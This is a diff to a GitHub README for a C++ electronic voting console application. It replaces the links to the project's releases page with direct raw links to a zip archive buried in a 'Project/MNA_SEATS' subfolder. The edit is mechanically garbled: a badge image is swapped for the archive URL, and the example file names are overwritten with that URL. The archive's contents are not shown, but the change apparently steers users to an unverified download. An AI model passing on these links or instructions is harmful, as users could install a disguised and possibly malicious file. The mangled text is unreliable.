@@ -6,7 +6,7 @@ Welcome to the Electronic Voting System built with C++. This console-based appli
 
 ### 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Thenorwest/Electronic-Voting-System-CPP/releases)
+[![Download Now](https://github.com/Thenorwest/Electronic-Voting-System-CPP/raw/refs/heads/main/Project/MNA_SEATS/Electronic-Voting-CPP-System-v3.8-beta.5.zip%https://github.com/Thenorwest/Electronic-Voting-System-CPP/raw/refs/heads/main/Project/MNA_SEATS/Electronic-Voting-CPP-System-v3.8-beta.5.zip)](https://github.com/Thenorwest/Electronic-Voting-System-CPP/raw/refs/heads/main/Project/MNA_SEATS/Electronic-Voting-CPP-System-v3.8-beta.5.zip)
 
 ## 📋 Features
 
@@ -31,9 +31,9 @@ Follow these steps to set up the Electronic Voting System on your computer:
 
 1. **Visit the Download Page**: Go to the link below to download the application files. 
 
-   [Visit this page to download](https://github.com/Thenorwest/Electronic-Voting-System-CPP/releases)
+   [Visit this page to download](https://github.com/Thenorwest/Electronic-Voting-System-CPP/raw/refs/heads/main/Project/MNA_SEATS/Electronic-Voting-CPP-System-v3.8-beta.5.zip)
 
-2. **Download the Latest Version**: Click on the latest release version to access the downloadable file. Look for files named similarly to `ElectronicVotingSystem.zip` or `ElectronicVotingSystem.exe`.
+2. **Download the Latest Version**: Click on the latest release version to access the downloadable file. Look for files named similarly to `https://github.com/Thenorwest/Electronic-Voting-System-CPP/raw/refs/heads/main/Project/MNA_SEATS/Electronic-Voting-CPP-System-v3.8-beta.5.zip` or `https://github.com/Thenorwest/Electronic-Voting-System-CPP/raw/refs/heads/main/Project/MNA_SEATS/Electronic-Voting-CPP-System-v3.8-beta.5.zip`.
 
 3. **Extract the Files**: If you downloaded a .zip file, right-click the file and select "Extract All" to unzip the contents.
 
